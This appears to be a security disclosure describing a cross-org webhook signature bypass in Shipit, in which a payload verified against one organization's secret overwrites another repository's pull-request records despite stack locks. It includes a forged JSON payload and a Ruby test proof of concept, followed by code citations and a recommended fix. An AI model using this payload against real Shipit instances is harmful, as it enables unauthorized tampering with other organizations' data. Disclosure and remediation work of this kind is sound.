### Title
Cross-org signature bypass lets an attacker mutate another repository's `PullRequest` via `EditedHandler`, with no lock/authorization check - ([File: app/controllers/shipit/webhooks_controller.rb], [File: app/models/shipit/webhooks/handlers/pull_request/edited_handler.rb])

### Summary
`WebhooksController#verify_signature` selects the HMAC secret to verify against using `repository.owner.login`/`organization.login` from the attacker-controlled JSON body, while `EditedHandler#repository`/`#pull_request` resolve the *target* repository using the independent `repository.full_name` field from the same body. Because nothing binds these two fields together, an attacker who controls their own (optionally secretless) GitHub org configured in Shipit can forge a payload whose signature is valid for their own org while `repository.full_name` names a victim repository, and `EditedHandler#process` will then unconditionally overwrite that victim `PullRequest`'s title/state/labels/assignees with no `Stack#deployable?`, `lock_reason`, or `Shipit.github_teams` check.

### Finding Description
Broken binding (stated as an equality that must hold but doesn't):
`org_used_for_signature_verification(payload.repository.owner.login) == org_owning_the_mutated_record(payload.repository.full_name.split('/').first)`

Trace:
- `WebhooksController#verify_signature` computes `repository_owner = params.dig('repository','owner','login') || params.dig('organization','login')` and calls `Shipit.github(organization: repository_owner).verify_webhook_signature(...)`. [1](#0-0) [2](#0-1) 
- `GitHubApp#verify_webhook_signature` returns `true` unconditionally when the resolved org has no `webhook_secret` configured, and otherwise verifies HMAC against that org's own secret: `return true unless webhook_secret`. [3](#0-2) 
- Multi-org configs are looked up purely by the org name string via `github_app_config`, so any org string present in Shipit's secrets (including one the attacker legitimately owns/administers, e.g. `secretless` or with a secret only the attacker knows) is a valid signing target. [4](#0-3) 
- `EditedHandler#repository` and `#pull_request`, however, resolve the target using a *different* JSON field, `params.repository.full_name`, via `Shipit::Repository.from_github_repo_name`: [5](#0-4) 
- `EditedHandler#process` then updates the located `PullRequest` unconditionally, with zero reference to `stack.deployable?`, `stack.lock_reason`/`locked?`, or `Shipit.github_teams`: [6](#0-5) 
- `PullRequest#github_pull_request=` overwrites `title`, `state`, `additions`, `deletions`, `user`, `assignees`, `labels`, and `head` from the attacker-supplied `pull_request` payload fields. [7](#0-6) 
- `Stack#locked?`/`lock_reason` exist and are consulted elsewhere for deploy gating, but `EditedHandler` never references them. [8](#0-7) 

Exploit flow: attacker crafts `POST /webhooks` with header `X-Github-Event: pull_request`, body `{"action":"edited","number":<victim PR number>,"pull_request":{...attacker-chosen title/labels/assignees...},"repository":{"owner":{"login":"attacker-org"},"full_name":"victim-org/victim-repo"},"sender":{"login":"attacker"}}`, signed (or unsigned, if `attacker-org` is configured without `webhook_secret`) for `attacker-org`. `verify_signature` passes because it only checks `attacker-org`'s secret against `repository.owner.login`. `EditedHandler` then loads and overwrites the `PullRequest` belonging to `victim-org/victim-repo`'s `Stack`, regardless of that stack's `lock_reason`/`deployable?` state.

Existing guards checked and why they don't stop this: `drop_unhandled_event` only checks the event name is registered, not the payload consistency. `verify_signature`'s only cross-check is against `repository.owner.login`/`organization.login`, never against `repository.full_name`. `EditedHandler`'s `params` schema (`ExplicitParameters`) validates types/presence of fields but never validates that `repository.full_name`'s owner segment matches `repository.owner.login`. No `require_permission!`, `User#authorized?`, or team check exists in this handler at all.

### Impact Explanation
An attacker who administers even one org registered in Shipit (with no webhook secret, or with a secret only they know) can, per request, overwrite the `title`, `state`, `labels`, `assignees`, and linked `head` commit of any `PullRequest` row belonging to any other repository/stack tracked by the same Shipit instance — a payload authenticated for one repository mutating another repository's data. This is repeatable against arbitrary victim repositories/stacks known to the attacker (any PR number), and is independent of the victim stack's lock state, meaning it also silently defeats the "locked" invariant operators rely on for PR metadata used by dashboards/automation. This matches the Critical category "a payload for one repository mutating another's stack, commit, task or team."

### Likelihood Explanation
Preconditions: (1) Shipit is configured with multi-org GitHub App secrets (`github_app_config`) and at least one org — the attacker's own — is either secretless or has a secret the attacker knows because they administer that org's GitHub App/webhook config; (2) the attacker knows or can guess a valid PR `number` on the victim repository (public PR numbers are typically visible/discoverable). No Shipit session, API token, or GitHub org membership in the victim org is required. Attacker cost is a single crafted HTTP POST; fully repeatable and scriptable against many repositories/PRs.

### Recommendation
In `WebhooksController#verify_signature`, or in each handler's `repository` resolution, enforce that the org used to select/verify the webhook secret is the same org referenced by every repository-identifying field used downstream (`repository.full_name`'s owner segment, and any `base.repo.full_name`/`head.repo.full_name` used by handlers). Reject the request if they diverge. Additionally, `EditedHandler#process` (and its siblings) should consult `stack.deployable?`/`locked?` state or otherwise treat webhook-originated writes as advisory-only where a stack is locked/archived, and generally derive the target repository from a value verified during signature validation rather than re-parsing an independent field from the same untrusted payload.

### Proof of Concept
```ruby
# test/controllers/webhooks_controller_test.rb (new test)
test "cross-org payload can mutate a victim repository's PullRequest despite lock" do
  victim_stack = shipit_stacks(:shipit) # belongs to repository owned by "shopify"
  victim_stack.update!(lock_reason: "freeze")
  pr = victim_stack.pull_requests.create!(number: 42, title: "original", head: shipit_commits(:first))

  # Attacker's own org "attacker-org" is configured secretless in Shipit secrets
  Shipit.stubs(:github).with(organization: "attacker-org").returns(
    Shipit::GitHubApp.new("attacker-org", {}) # no webhook_secret => verify_webhook_signature always true
  )

  body = {
    action: "edited",
    number: 42,
    pull_request: {
      id: 1, number: 42, url: "https://api.github.com/repos/victim-org/victim-repo/pulls/42",
      title: "PWNED", state: "open", additions: 1, deletions: 1,
      head: { sha: pr.head.sha, ref: "attacker-branch" },
      user: { login: "attacker" }, assignees: [], labels: []
    },
    repository: { owner: { login: "attacker-org" }, full_name: victim_stack.repository.github_repo_name },
    sender: { login: "attacker" }
  }.to_json

  request.headers['X-Github-Event'] = 'pull_request'
  request.headers['X-Hub-Signature'] = 'sha1=irrelevant-because-secretless'

  assert_changes -> { pr.reload.title }, from: "original", to: "PWNED" do
    post :create, body:, as: :json
  end

  assert_equal "freeze", victim_stack.reload.lock_reason # lock untouched, but PR mutated anyway
end
```
Assertion on both sides of the binding: before the fix, `pr.reload.title == "PWNED"` even though `victim_stack.lock_reason.present?` and the signature was only ever verified against `attacker-org`'s (non-)secret, not `victim-org`'s. After a fix enforcing owner/full_name consistency (or a lock check in `EditedHandler`), the request should be rejected (422) or the update should be a no-op, and `pr.reload.title` should remain `"original"`.

### Citations

**File:** app/controllers/shipit/webhooks_controller.rb (L24-30)
```ruby
    def verify_signature
      github_app = Shipit.github(organization: repository_owner)
      verified = github_app.verify_webhook_signature(
        request.headers['X-Hub-Signature'],
        request.raw_post
      )
      head(422) unless verified
```

**File:** app/controllers/shipit/webhooks_controller.rb (L59-62)
```ruby
    def repository_owner
      # Fallback to the organization sub-object if repository isn't included in the payload
      params.dig('repository', 'owner', 'login') || params.dig('organization', 'login')
    end
```

**File:** lib/shipit/github_app.rb (L76-83)
```ruby
    def verify_webhook_signature(signature, message)
      return true unless webhook_secret

      algorithm, signature = signature.split("=", 2)
      return false unless algorithm == 'sha1'

      SecureCompare.secure_compare(signature, OpenSSL::HMAC.hexdigest(algorithm, webhook_secret, message))
    end
```

**File:** lib/shipit.rb (L170-200)
```ruby
  def github(organization: github_default_organization)
    # Backward compatibility
    # nil signifies the single github app config schema is being used
    if github_default_organization.nil?
      config = secrets.github
    else
      config = github_app_config(organization)
      raise GithubOrganizationUnknown, organization if config.nil?
    end
    @github ||= {}
    @github[organization] ||= GitHubApp.new(organization, config)
  end

  def github_default_organization
    return nil unless secrets&.github

    org = secrets.github.keys.first
    TOP_LEVEL_GH_KEYS.include?(org) ? nil : org
  end

  def github_organizations
    return [nil] unless github_default_organization

    secrets.github.keys
  end

  def github_app_config(organization)
    github_config = secrets.github.deep_transform_keys(&:downcase)
    github_organization = organization.downcase.to_sym
    github_config[github_organization]
  end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/edited_handler.rb (L41-45)
```ruby
          def process
            return unless respond_to_pull_request_edited?

            pull_request.update(github_pull_request: params.pull_request) if pull_request.present?
          end
```

**File:** app/models/shipit/webhooks/handlers/pull_request/edited_handler.rb (L49-65)
```ruby
          def pull_request
            @pull_request ||= Shipit::PullRequest
                              .joins(:stack, stack: :repository)
                              .find_by(
                                number: params.number,
                                stacks: {
                                  repositories:
                                    {
                                      id: repository.id
                                    }
                                }
                              )
          end

          def repository
            Shipit::Repository.from_github_repo_name(params.repository.full_name) || Shipit::NullRepository.new
          end
```

**File:** app/models/shipit/pull_request.rb (L36-50)
```ruby
    def github_pull_request=(github_pull_request)
      self.github_id = github_pull_request.id
      self.number = github_pull_request.number
      self.api_url = github_pull_request.url
      self.title = github_pull_request.title
      self.state = github_pull_request.state
      self.additions = github_pull_request.additions
      self.deletions = github_pull_request.deletions
      self.user = User.find_or_create_by_login!(github_pull_request.user.login)
      self.assignees = github_pull_request.assignees.map do |github_user|
        User.find_or_create_by_login!(github_user.login)
      end
      self.labels = github_pull_request.labels.map(&:name)
      self.head = find_or_create_commit_from_github_by_sha!(github_pull_request.head.sha)
    end
```

**File:** app/models/shipit/stack.rb (L477-484)
```ruby
    def locked?
      lock_reason.present?
    end

    def lock(reason, user)
      params = { lock_reason: reason, lock_author: user }
      update!(params)
    end
```
